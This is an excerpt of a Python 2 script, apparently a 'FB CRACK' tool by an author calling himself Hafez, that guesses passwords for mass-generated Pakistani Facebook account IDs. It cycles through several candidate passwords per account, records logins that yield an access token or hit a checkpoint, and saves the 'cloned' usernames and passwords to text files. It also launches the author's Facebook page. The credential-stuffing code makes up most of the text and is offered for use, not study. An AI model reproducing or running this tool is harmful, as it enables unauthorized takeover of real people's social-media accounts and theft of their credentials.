# MY FD ID @ITS.SHA4T0
# MY FB  GROUP @CCT
#MY GITHUB HTTPS://GITHUB.COM/SHA4T0
#THIS SCRIPT FREE 
...
Mking_page = random.choice(["https://www.facebook.com/hafezvai.official1200umm"])

page = Mking_page

def youtube():
	Style_profaisor("  please follow my Id :) Thank you")
	os.system("xdg-open https://www.facebook.com/hafezvai.official1200umm")
	menu()
	
#MY FACEBOOK page

def telegram():
	Style_profaisor("  please Follow My FACEBOOK page :) Thank you")
	os.system("xdg-open https://www.facebook.com/hafezvai.official.com12/")
...
\033[1;97m--------------------------------------------------
\033[1;91m Author      : HAFEZ VAI
\033[1;91m GitHub      : https://github.com/hafezvai
\033[1;91m Facebook     : Md Mamunur Rashid
\033[1;91m ITS HAFEZ VAU
\033[1;97m--------------------------------------------------
"""
...
def menu():
    ...
    print logo
    print ''
    print '             \x1b[1;93m[1]\x1b[1;93m START PAKISTAN  FB CRACK              \n '
    time.sleep(0.05)
    Select_menu()
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK Pakistan FB ALL SIM CREATED BY Hafez'
        print '\x1b[1;92m THISE SCRIPT CREATED BY hafez '
        print '\x1b[1;92m              ENJOY THIS COMMEND  '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[SHA4T0_OK] ' + k + c + user + ' | ' + pass1
                okb = open('Mking.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[HAFEZ_CP] ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[HAFEZ_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Mking.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[HAFEZ_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Mking.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[HAFEZ_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('SHA4T0.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[HAFEZ_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('SHA4T0.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[HAFEZ_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('SHA4T0.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[HAFEZ_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('SHA4T0.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[HAFEZ_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('SHA4T0.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[HAFEZ_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('SHA4T0.txt', 'a')
    ...
    print ' Cloned Accounts Has Been Saved : SHA4T0.txt'
